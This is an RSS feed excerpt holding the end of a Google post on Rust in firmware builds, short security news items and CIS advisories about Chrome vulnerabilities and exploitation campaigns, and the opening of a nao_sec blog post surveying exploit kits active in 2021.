</span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">-C codegen-unit=1</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> results in further optimizations in addition to reproducibility.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">If using Cargo to build, the following Cargo.toml settings are recommended to reduce the output library size:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>[profile.release]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>panic</span><span> </span><span>=</span><span> </span><span>"abort"</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>lto</span><span> </span><span>=</span><span> </span><span>true</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>codegen-units</span><span> </span><span>=</span><span> </span><span>1</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>strip = "symbols"</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span># opt-level "z" may produce better results in some circumstances</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span>opt-level</span><span> </span><span>=</span><span> </span><span>"s"&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Passing the </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">-Z remap-cwd-prefix=.</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> flag to </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">rustc</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> or to Cargo via the </span><span style="color: #0d904f; font-family: Consolas, sans-serif; font-size: 11pt; vertical-align: baseline;">RUSTFLAGS</span><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> env var when building with Cargo to strip cwd path strings.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">In terms of performance, Rust demonstrates similar performance to C. The most relevant example may be the Rust binder Linux kernel driver, which found “</span><a href="https://lore.kernel.org/rust-for-linux/20231101-rust-binder-v1-0-08ba9197f637@google.com/#:~:text=We%27ve%20found%20that%20Rust%20binder%20has%20similar%20performance%20to%20C%20binder%20on%20the%0AbinderThroughputTest%20benchmark.%20The%20average%20latencies%20fluctuate%20between%0A%2D1.96%25%20and%20%2B1.38%25."><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">that Rust binder has similar performance to C binder</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">”.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">When linking LTO’d Rust staticlibs together with C/C++, it’s recommended to ensure a single Rust staticlib ends up in the final linkage, otherwise there may be </span><a href="https://github.com/rust-lang/rust/issues/44322"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">duplicate symbol errors</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;"> when linking. This may mean combining multiple Rust shims into a single static library by re-exporting them from a wrapper module.</span></p><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 12pt; margin-top: 12pt;"><span style="font-family: Arial, sans-serif; font-size: 20pt; font-weight: 400; vertical-align: baseline;">Memory Safety for Firmware, Today</span></h1><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">Using the process outlined in this blog post, You can begin to introduce Rust into large legacy firmware code bases immediately. Replacing security critical components with off-the-shelf open-source memory-safe implementations and developing new features in a memory safe language will lead to fewer critical vulnerabilities while also providing an </span><a href="https://opensource.googleblog.com/2023/06/rust-fact-vs-fiction-5-insights-from-googles-rust-journey-2022.html"><span style="color: #1155cc; font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">improved developer experience</span></a><span style="font-family: Arial, sans-serif; font-size: 11pt; vertical-align: baseline;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Roboto, sans-serif; font-size: 12pt; font-style: italic; vertical-align: baseline;">Special thanks to our colleagues who have supported and contributed to these efforts: Roger Piqueras Jover, Stephan Chen, Gil Cukierman, Andrew Walbran, and Erik Gilling </span></p><div><span style="font-family: Roboto, sans-serif; font-size: 12pt; font-style: italic; vertical-align: baseline;"><br /></span></div></span></div>
]]></content:encoded>
<pubDate>2024-09-04T12:02:42.699-04:00</pubDate>
</item>
<item>
<title>Chrome 128 Updates Patch High-Severity Vulnerabilities</title>
<link>https://www.securityweek.com/chrome-128-updates-patch-high-severity-vulnerabilities/</link>
<guid>https://www.securityweek.com/chrome-128-updates-patch-high-severity-vulnerabilities/</guid>
<content:encoded><![CDATA[
<p>Google has released two Chrome 128 updates to address six high-severity vulnerabilities reported by external researchers.</p>
<p>The post <a href="https://www.securityweek.com/chrome-128-updates-patch-high-severity-vulnerabilities/">Chrome 128 Updates Patch High-Severity Vulnerabilities</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Tue, 03 Sep 2024 07:46:45 +0000</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-094</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-094</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 03 Sep 2024 00:27:22 -0400</pubDate>
</item>
<item>
<title>North Korean Hackers Deploy FudModule Rootkit via Chrome Zero-Day Exploit</title>
<link>https://thehackernews.com/2024/08/north-korean-hackers-deploy-fudmodule.html</link>
<guid>https://thehackernews.com/2024/08/north-korean-hackers-deploy-fudmodule.html</guid>
<content:encoded><![CDATA[
A recently patched security flaw in Google Chrome and other Chromium web browsers was exploited as a zero-day by North Korean actors in a campaign designed to deliver the FudModule rootkit.
The development is indicative of the persistent efforts made by the nation-state adversary, which had made a habit of incorporating rafts of Windows zero-day exploits into its arsenal in recent months.
]]></content:encoded>
<pubDate>Sat, 31 Aug 2024 21:05:00 +0530</pubDate>
</item>
<item>
<title>Choosing the Right Browser: Privacy Tips from Apple and Google</title>
<link>https://www.cysecurity.news/2024/08/choosing-right-browser-privacy-tips.html</link>
<guid>https://www.cysecurity.news/2024/08/choosing-right-browser-privacy-tips.html</guid>
<content:encoded><![CDATA[
<p style="text-align: justify;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikZgl5ykDoLgjiGAq2FNjf2qsMv1yiz4iR2byAssw-wWwgiwSo2UkA5VCdi9IOJ7xS1060H5Xx_goNdoNZfNam9fIrLLTzp1wP0FijlrPRSH6sVTv9uWEh98LxbwB9ha-9CjAXtxAeogrFz9WK8P5J1WUPnNQRgwOXz5n46VWWlKDFJu5a0SuOS3Rc94vO/s1280/website-6351151_1280.jpg" style="margin-left: 1em; margin-right: 1em;"><img alt="Apple vs. Google: The Battle for Browser Privacy" border="0" height="420" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikZgl5ykDoLgjiGAq2FNjf2qsMv1yiz4iR2byAssw-wWwgiwSo2UkA5VCdi9IOJ7xS1060H5Xx_goNdoNZfNam9fIrLLTzp1wP0FijlrPRSH6sVTv9uWEh98LxbwB9ha-9CjAXtxAeogrFz9WK8P5J1WUPnNQRgwOXz5n46VWWlKDFJu5a0SuOS3Rc94vO/w640-h420/website-6351151_1280.jpg" title="Apple vs. Google: The Battle for Browser Privacy" width="640" /></a></div><br />Apple has launched an <a href="https://www.youtube.com/watch?v=0HjDpPnxcP0" target="_blank">ad campaign</a> urging over a billion iPhone users to stop using Google Chrome, citing privacy concerns. This campaign has sparked a heated debate between two tech giants, Apple and Google, over the best way to protect user privacy online.<p></p><h3 style="text-align: justify;">Apple’s Stance on Privacy</h3><p style="text-align: justify;">Apple has long positioned itself as a champion of user <a href="https://www.cysecurity.news/2024/08/google-assures-privacy-with-gemini-ai.html" target="_blank">privacy</a>. In its latest campaign, Apple highlights the extensive use of tracking cookies by Google Chrome. These cookies, Apple claims, follow users across the web, collecting data on their browsing habits. Apple argues that Chrome’s Incognito mode, which many users rely on for private browsing, isn’t truly private. According to Apple, Incognito mode still allows websites to track user activity, albeit to a lesser extent.</p><p style="text-align: justify;">To counter these privacy concerns, Apple promotes its own browser, Safari, as a more secure alternative. Safari, Apple claims, uses Intelligent Tracking Prevention (ITP) to limit the ability of advertisers to track users across websites. This feature, combined with other privacy-focused tools, makes Safari a more attractive option for users who prioritize their online privacy.</p><h3 style="text-align: justify;">Google’s Response</h3><p style="text-align: justify;"><a href="https://www.cysecurity.news/2024/08/google-assures-privacy-with-gemini-ai.html" target="_blank">Google</a>, on the other hand, has defended Chrome’s privacy practices. In response to Apple’s campaign, Google emphasized that Chrome is designed to keep user data safe and give users control over their privacy settings. Google points out that Chrome offers a range of privacy features, including the ability to block third-party cookies and manage site permissions.</p><p style="text-align: justify;">Google also highlights its commitment to transparency. The company regularly updates its privacy policies and provides users with clear information about how their data is collected and used. Google argues that this transparency, combined with robust privacy controls, makes Chrome a trustworthy choice for users.</p><h3 style="text-align: justify;">The Broader Context</h3><p style="text-align: justify;">This clash between Apple and Google is part of a larger conversation about online privacy. As more of our lives move online, the amount of data we generate has skyrocketed. This data is incredibly valuable to advertisers, who use it to target ads more effectively. However, this data collection has raised significant privacy concerns.</p><p style="text-align: justify;">Many users are unaware of the extent to which their online activities are tracked. Even when using private browsing modes, such as Chrome’s Incognito mode, users may still be tracked by websites and advertisers. This has led to calls for greater transparency and stronger privacy protections.</p><h3 style="text-align: justify;">Choosing the Right Browser</h3><p style="text-align: justify;">So, what does this mean for the average user? When choosing a browser, it’s important to consider your privacy needs. If you prioritize privacy and want to limit tracking as much as possible, Safari may be the better choice. Apple’s Intelligent Tracking Prevention and other privacy features can help protect your data from advertisers.</p><p style="text-align: justify;">However, if you value customization and control over your browsing experience, Chrome offers a range of privacy tools that can be tailored to your needs. Google’s transparency about its data collection practices also provides users with a clear understanding of how their data is used.</p><p style="text-align: justify;">Ultimately, the choice between Safari and Chrome comes down to personal preference. Both browsers have their strengths and weaknesses, and the best choice will depend on your individual privacy needs and browsing habits.</p>
]]></content:encoded>
<pubDate>2024-08-31T10:05:15.431-04:00</pubDate>
</item>
<item>
<title>Microsoft Says North Korean Cryptocurrency Thieves Behind Chrome Zero-Day</title>
<link>https://www.securityweek.com/microsoft-says-north-korean-cryptocurrency-thieves-behind-chrome-zero-day/</link>
<guid>https://www.securityweek.com/microsoft-says-north-korean-cryptocurrency-thieves-behind-chrome-zero-day/</guid>
<content:encoded><![CDATA[
<p>Redmond's threat intel team said exploitation of CVE-2024-7971 can be attributed to a North Korean APT targeting the cryptocurrency sector for financial gain. </p>
<p>The post <a href="https://www.securityweek.com/microsoft-says-north-korean-cryptocurrency-thieves-behind-chrome-zero-day/">Microsoft Says North Korean Cryptocurrency Thieves Behind Chrome Zero-Day</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Fri, 30 Aug 2024 20:11:22 +0000</pubDate>
</item>
<item>
<title>North Korean hackers exploit Chrome zero-day to deploy rootkit</title>
<link>https://www.bleepingcomputer.com/news/security/north-korean-hackers-exploit-chrome-zero-day-to-deploy-rootkit/</link>
<guid>https://www.bleepingcomputer.com/news/security/north-korean-hackers-exploit-chrome-zero-day-to-deploy-rootkit/</guid>
<content:encoded><![CDATA[
North Korean hackers have exploited a recently patched Google Chrome zero-day (CVE-2024-7971) to deploy the FudModule rootkit after gaining SYSTEM privileges using a Windows Kernel exploit. [...]
]]></content:encoded>
<pubDate>Fri, 30 Aug 2024 13:04:18 -0400</pubDate>
</item>
<item>
<title>Google Chrome V8 Type Confusion</title>
<link>https://packetstormsecurity.com/files/180477/CVE-2024-5274-main.zip</link>
<guid>https://packetstormsecurity.com/files/180477/CVE-2024-5274-main.zip</guid>
<content:encoded><![CDATA[
Google Chrome versions prior to 125.0.6422.112 V8 type confusion proof of concept exploit.
]]></content:encoded>
<pubDate>Fri, 30 Aug 2024 15:20:56 GMT</pubDate>
</item>
<item>
<title>Russian Hackers Exploit Safari and Chrome Flaws in High-Profile Cyberattack</title>
<link>https://thehackernews.com/2024/08/russian-hackers-exploit-safari-and.html</link>
<guid>https://thehackernews.com/2024/08/russian-hackers-exploit-safari-and.html</guid>
<content:encoded><![CDATA[
Cybersecurity researchers have flagged multiple in-the-wild exploit campaigns that leveraged now-patched flaws in Apple Safari and Google Chrome browsers to infect mobile users with information-stealing malware.
"These campaigns delivered n-day exploits for which patches were available, but would still be effective against unpatched devices," Google Threat Analysis Group (TAG) researcher Clement
]]></content:encoded>
<pubDate>Thu, 29 Aug 2024 21:29:00 +0530</pubDate>
</item>
<item>
<title>Google increases Chrome bug bounty rewards up to $250,000</title>
<link>https://www.bleepingcomputer.com/news/google/google-increases-chrome-bug-bounty-rewards-up-to-250-000/</link>
<guid>https://www.bleepingcomputer.com/news/google/google-increases-chrome-bug-bounty-rewards-up-to-250-000/</guid>
<content:encoded><![CDATA[
Google has more than doubled payouts for Google Chrome security flaws reported through its Vulnerability Reward Program, with the maximum possible reward for a single bug now exceeding $250,000. [...]
]]></content:encoded>
<pubDate>Wed, 28 Aug 2024 13:00:00 -0400</pubDate>
</item>
<item>
<title>Google Now Offering Up to $250,000 for Chrome Vulnerabilities</title>
<link>https://www.securityweek.com/google-now-offering-up-to-250000-for-chrome-vulnerabilities/</link>
<guid>https://www.securityweek.com/google-now-offering-up-to-250000-for-chrome-vulnerabilities/</guid>
<content:encoded><![CDATA[
<p>Google has significantly increased the rewards for Chrome browser vulnerabilities, offering up to $250,000 for remote code execution bugs.</p>
<p>The post <a href="https://www.securityweek.com/google-now-offering-up-to-250000-for-chrome-vulnerabilities/">Google Now Offering Up to $250,000 for Chrome Vulnerabilities</a> appeared first on <a href="https://www.securityweek.com">SecurityWeek</a>.</p>
]]></content:encoded>
<pubDate>Wed, 28 Aug 2024 17:00:00 +0000</pubDate>
</item>
<item>
<title>Google Chrome Update Fixes Flaw Exploited in the Wild</title>
<link>https://www.darkreading.com/vulnerabilities-threats/google-chrome-update-fixes-flaw-exploited-in-the-wild</link>
<guid>https://www.darkreading.com/vulnerabilities-threats/google-chrome-update-fixes-flaw-exploited-in-the-wild</guid>
<content:encoded><![CDATA[
New Chrome release set to roll out over the next few days addresses 38 security issues in the browser.
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 18:38:17 GMT</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-092</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-092</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 23 Aug 2024 02:16:03 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-087</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-087</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 07 Aug 2024 03:03:31 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-084</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-084</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 23 Jul 2024 23:03:48 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-081</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-081</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 17 Jul 2024 08:05:07 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-074</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-074</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 25 Jun 2024 15:04:25 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-072</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-072</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 12 Jun 2024 09:10:19 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-064</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-064</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 31 May 2024 02:01:37 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-061</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-061</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome that could allow for arbitrary code execution. Google Chrome is a web browser used to access the internet. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the logged on user, an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have less rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Fri, 24 May 2024 08:59:23 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-058</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-058</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 15 May 2024 20:27:29 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-052</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-052</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 14 May 2024 15:03:37 -0400</pubDate>
</item>
<item>
<title>A Vulnerability in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-050</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-050</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of this vulnerability could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Thu, 09 May 2024 22:13:23 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-047</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-047</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 07 May 2024 20:53:37 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-044</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-044</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 30 Apr 2024 21:42:46 -0400</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-043</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-043</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, which could allow for arbitrary code execution. Successful exploitation of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Wed, 24 Apr 2024 18:47:25 -0400</pubDate>
</item>
<item>
<title>Exploit Kit still sharpens a sword</title>
<link>http://nao-sec.org/2021/04/exploit-kit-still-sharpens-a-sword.html</link>
<guid>http://nao-sec.org/2021/04/exploit-kit-still-sharpens-a-sword.html</guid>
<content:encoded><![CDATA[
<p>Note: This blog post doesn’t make sense to many</p>

<p>It’s 2021 now. Moreover, the quarter has already passed. I thought Drive-by Download attack was dead four years ago. Angler Exploit Kit has disappeared, pseudo-Darkleech and EITest campaign have disappeared, and RIG Exploit Kit has also declined. At that time, Drive-by Download attack was definitely supposed to die. However, even if in 2021, it will not disappear fire still slightly.</p>

<p>In April 2021, I received some incredible notices. For example, there are the following notifications.</p>

<ul>
  <li>PurpleFox Exploit Kit has started exploiting CVE-2021-26411</li>
  <li>RIG Exploit Kit has started exploiting CVE-2021-26411</li>
  <li>Bottle Exploit Kit is back, and has started exploiting CVE-2020-1380 and CVE-2021-26411</li>
  <li>Underminer Exploit Kit is back</li>
</ul>

<p>Repeat again. It’s 2021 now. Not 2017. Internet Explorer was taken away by Chrome and Edge, and Drive-by Download attack was supposed to die. Why are there still Drive-by Download attacks? Here are some reasons, including the opinions of your friends.</p>

<ol>
  <li>Internet Explorer is still used in some countries/regions including Japan</li>
  <li>Due to the influence of corona, remote work has increased, and the number of users with network security vulnerabilities has increased</li>
  <li>Internet Explorer vulnerabilities still discovered and exploit code published</li>
</ol>

<p>In reality, these are intricately intertwined, and there may be different reasons.</p>

<p>In any case, Drive-by Download attacks are still being observed. Moreover, it is a little more active. This is irrelevant for most people. Because most people don’t use Internet Explorer. If you don’t use Internet Explorer, a typical Exploit Kit attack is not a threat. A small number of targeted attacks may use Chrome’s 0day, which is not discussed here.</p>

<p>For the few enthusiastic Internet Explorer users that exist, I write this blog post. In other words, as of April 2021, I will introduce the characteristics of common Drive-by Download attacks that you may encounter. Thanks to my friends (@jeromesegura, @nao_sec members) for helping me write this blog post.</p>

<h2 id="exploit-kit-landscape">Exploit Kit Landscape</h2>
<p>As of April 2021, the following 6 types of Exploit Kits have been observed to be active.</p>

<ul>
  <li>RIG</li>
  <li>Spelevo</li>
  <li>PurpleFox</li>
  <li>Underminer</li>
  <li>Bottle</li>
  <li>Magnitude</li>
</ul>

<p>nao_sec has been running a fully automatic Drive-by Download attack observation environment called Augma System[1] for three years. The data observed by this is as follows. Some Exploit Kits are not counted because they are observed in different environments.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/ek.png" /></p>

<p>The features of the 6 types of Exploit Kits currently observed are as follows.</p>
